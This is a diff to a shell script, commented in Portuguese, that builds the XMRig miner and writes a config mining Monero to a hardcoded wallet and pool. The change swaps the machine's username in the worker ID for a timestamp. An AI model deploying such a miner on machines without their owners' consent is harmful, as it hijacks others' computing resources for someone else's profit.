@@ -23,11 +23,11 @@ sudo cmake ..
 sudo make -j$(nproc)
 
 # Cria um arquivo de configuração para o XMRig
-# Adiciona o nome de usuário da máquina à carteira
-USER_NAME=$(whoami)
+# Adiciona um identificador único à carteira, sem expor nome de usuário específico
+RANDOM_IDENTIFIER=$(date +%s)  # Gerar um identificador único com a data/hora atual
 WALLET="45mqjub6KDy14qcSZcjjDA1kXFGu5xiBVPJKoZrMgicH1skGVVzPzVYHJR27CbyiyKDzFf89gEbUnBpXj7ViQrGgPCQTNT2"
 POOL="xmrpool.eu:9999"
-USER_WALLET="${WALLET}+${USER_NAME}"
+USER_WALLET="${WALLET}+worker${RANDOM_IDENTIFIER}"
 
 # Cria o arquivo de configuração
 cat > config.json <<EOF
@@ -40,7 +40,7 @@ cat > config.json <<EOF
     "url": "${POOL}",
     "user": "${USER_WALLET}",
     "pass": "x",
-    "rig-id": "${USER_NAME}",
+    "rig-id": "worker${RANDOM_IDENTIFIER}",
     "keepalive": true,
     "nicehash": false
 }
